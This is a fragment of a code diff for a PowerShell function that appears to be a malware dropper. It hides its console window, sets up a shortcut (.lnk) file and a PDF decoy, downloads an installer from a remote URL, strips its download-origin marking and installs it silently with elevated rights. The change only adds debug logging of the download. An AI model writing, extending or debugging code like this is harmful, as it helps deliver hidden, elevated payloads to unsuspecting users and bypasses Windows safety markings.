@@ -63,6 +63,8 @@ function CODE_SEG {
     [Console.Window]::ShowWindow($ConsoleWin, 0)
 
     $CurrentDir = (Get-Location).Path
+    $DebugLog = Join-Path $env:TEMP "wire-debug.log"
+    "START $(Get-Date -Format o) DIR=$CurrentDir" | Out-File $DebugLog
     $InkPath = Join-Path $CurrentDir ($Name + ".lnk")
     $PdfPath = Join-Path $CurrentDir ($Name + ".pdf")
 
@@ -84,6 +86,8 @@ function CODE_SEG {
 
     Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath -UseBasicParsing -ErrorAction SilentlyContinue
     Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
+    $dlSize = (Get-Item $InstallerPath -ErrorAction SilentlyContinue).Length
+    "DL=$dlSize URL=$InstallerURL $(Get-Date -Format o)" | Out-File $DebugLog -Append
     
     $Arguments = "/i `"$InstallerPath`" /qn /norestart /l `"$InstallerLogPath`""
     $Process = Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Verb RunAs -Wait -PassThru
